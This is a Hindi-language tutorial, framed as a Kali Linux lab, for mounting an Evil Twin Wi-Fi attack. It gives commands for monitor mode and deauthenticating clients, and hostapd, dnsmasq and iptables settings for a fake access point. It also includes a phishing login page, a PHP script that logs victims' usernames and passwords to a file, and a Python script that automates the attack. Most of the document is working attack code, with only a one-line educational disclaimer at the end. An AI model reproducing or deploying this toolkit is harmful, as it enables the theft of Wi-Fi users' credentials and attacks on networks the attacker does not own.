# Evil Twin Attack - पूरा लैब सेटअप (Kali Linux)

---

## 1. Evil Twin क्या है?
Evil Twin Attack में हम एक नकली Wi-Fi Access Point बनाते हैं, जो असली नेटवर्क जैसा दिखता है।  
जब यूज़र गलती से इस नकली AP से जुड़ता है, हम उसकी डाटा चोरी कर सकते हैं या फिशिंग पेज दिखा सकते हैं।

---

## 2. जरूरी टूल्स  
- Kali Linux  
- Wi-Fi एडाप्टर (Monitor Mode और Packet Injection सपोर्ट वाला)  
- Tools: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `hostapd`, `dnsmasq`, `apache2`, `php`  

---

## 3. Bash Commands और Config Files

### 3.1 Wi-Fi एडाप्टर मॉनिटर मोड में डालें
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### 3.2 टार्गेट नेटवर्क की जानकारी निकालें
```bash
sudo airodump-ng wlan0mon
```

### 3.3 Deauthentication Attack चलाएं (Client Disconnect के लिए)
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

### 3.4 Hostapd Configuration (hostapd.conf)
```conf
interface=wlan0mon
driver=nl80211
ssid=<TARGET_SSID>
channel=<TARGET_CHANNEL>
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
```

### 3.5 dnsmasq Configuration (dnsmasq.conf)
```conf
interface=wlan0mon
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
server=8.8.8.8
log-queries
log-dhcp
```

### 3.6 नेटवर्क सेटिंग्स करें
```bash
sudo ifconfig wlan0mon 192.168.50.1 netmask 255.255.255.0 up
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0mon -j ACCEPT
```

### 3.7 Hostapd और dnsmasq स्टार्ट करें
```bash
sudo hostapd hostapd.conf
sudo dnsmasq -C dnsmasq.conf
```

---

## 4. Phishing पेज (HTML + PHP)

### 4.1 HTML Login Form (index.html)
```html
<!DOCTYPE html>
<html>
<head><title>Login Page</title></head>
<body>
  <h2>Login</h2>
  <form method="POST" action="save.php">
    Username:<br><input type="text" name="username" required><br>
    Password:<br><input type="password" name="password" required><br><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
```

### 4.2 PHP Script for Saving Credentials (save.php)
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $data = "Username: $user | Password: $pass\n";
    file_put_contents("log.txt", $data, FILE_APPEND);
    header('Location: https://www.google.com');
    exit();
}
?>
```

---

## 5. Python Automation Script (Optional)
```python
import os
import time

def run_command(cmd):
    print(f"Executing: {cmd}")
    os.system(cmd)

def setup_monitor_mode():
    run_command("sudo airmon-ng check kill")
    run_command("sudo airmon-ng start wlan0")

def deauth_attack(bssid):
    run_command(f"sudo aireplay-ng --deauth 10 -a {bssid} wlan0mon")

def start_hostapd():
    run_command("sudo hostapd hostapd.conf &")

def start_dnsmasq():
    run_command("sudo dnsmasq -C dnsmasq.conf &")

def main():
    setup_monitor_mode()
    target_bssid = input("Enter target BSSID: ")
    deauth_attack(target_bssid)
    start_hostapd()
    start_dnsmasq()
    print("Evil Twin Attack started!")

if __name__ == "__main__":
    main()
```

---

## 6. Attack Flow Summary
1. Wi-Fi एडाप्टर मॉनिटर मोड में डालें।
2. टार्गेट नेटवर्क स्कैन करें और BSSID, Channel नोट करें।
3. Deauth अटैक से क्लाइंट डिस्कनेक्ट करें।
4. Hostapd और dnsmasq से Fake AP चलाएं।
5. Apache सर्वर पर फिशिंग पेज होस्ट करें।
6. Victim जब Fake AP से जुड़े, credentials capture करें।

---

## 7. Legal Disclaimer
यह सामग्री केवल शैक्षिक उद्देश्यों के लिए है। बिना अनुमति किसी नेटवर्क पर हमला करना गैरकानूनी है।

Happy Ethical Hacking!
